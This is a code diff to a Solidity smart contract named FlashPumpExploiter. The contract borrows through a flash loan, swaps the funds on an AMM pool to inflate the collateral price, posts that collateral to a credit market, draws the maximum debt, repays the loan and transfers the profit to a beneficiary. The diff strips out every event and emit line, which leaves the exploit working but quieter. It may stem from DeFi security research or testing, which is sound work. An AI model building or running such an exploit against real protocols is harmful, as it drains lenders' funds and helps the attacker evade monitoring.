@@ -19,13 +19,6 @@ contract FlashPumpExploiter is IFlashLoanCallback {
     uint256 public postedCollateral;
     uint256 public settledFlashTotal;
 
-    event ExploitInitiated(uint256 flashPrincipal);
-    event CollateralAcquired(uint256 stableSpent, uint256 collateralReceived);
-    event CollateralPosted(uint256 collateralAmount);
-    event DebtDrawnAtSkewedRate(uint256 debtAmount);
-    event FlashLoanRepaid(uint256 principal, uint256 feeAmount);
-    event SurplusTransferred(address indexed recipient, uint256 surplus);
-
     constructor(
         address stableToken_,
         address collateralToken_,
@@ -43,7 +36,6 @@ contract FlashPumpExploiter is IFlashLoanCallback {
     }
 
     function executeExploit(uint256 flashPrincipal) external {
-        emit ExploitInitiated(flashPrincipal);
         flashVault.requestFlashLoan(address(this), flashPrincipal, "");
     }
 
@@ -59,28 +51,23 @@ contract FlashPumpExploiter is IFlashLoanCallback {
         stableToken.approve(address(ammPool), principal);
         uint256 acquiredCollateral =
             ammPool.swapExactIn(principal, 0, address(stableToken), address(this));
-        emit CollateralAcquired(principal, acquiredCollateral);
 
         collateralToken.approve(address(creditMarket), acquiredCollateral);
         creditMarket.supplyCollateral(acquiredCollateral);
         postedCollateral = acquiredCollateral;
-        emit CollateralPosted(acquiredCollateral);
 
         uint256 maxCredit = creditMarket.availableCredit(address(this));
         creditMarket.drawDebt(maxCredit);
         drawnAgainstCollateral = maxCredit;
-        emit DebtDrawnAtSkewedRate(maxCredit);
 
         uint256 totalRepayment = principal + feeAmount;
         stableToken.approve(address(flashVault), totalRepayment);
         settledFlashTotal = totalRepayment;
-        emit FlashLoanRepaid(principal, feeAmount);
 
         uint256 currentStableBalance = stableToken.balanceOf(address(this));
         uint256 netSurplus = currentStableBalance > totalRepayment ? currentStableBalance - totalRepayment : 0;
         if (netSurplus > 0) {
             stableToken.transfer(beneficiary, netSurplus);
-            emit SurplusTransferred(beneficiary, netSurplus);
         }
 
         return keccak256("IFlashLoanCallback.executeOperation");
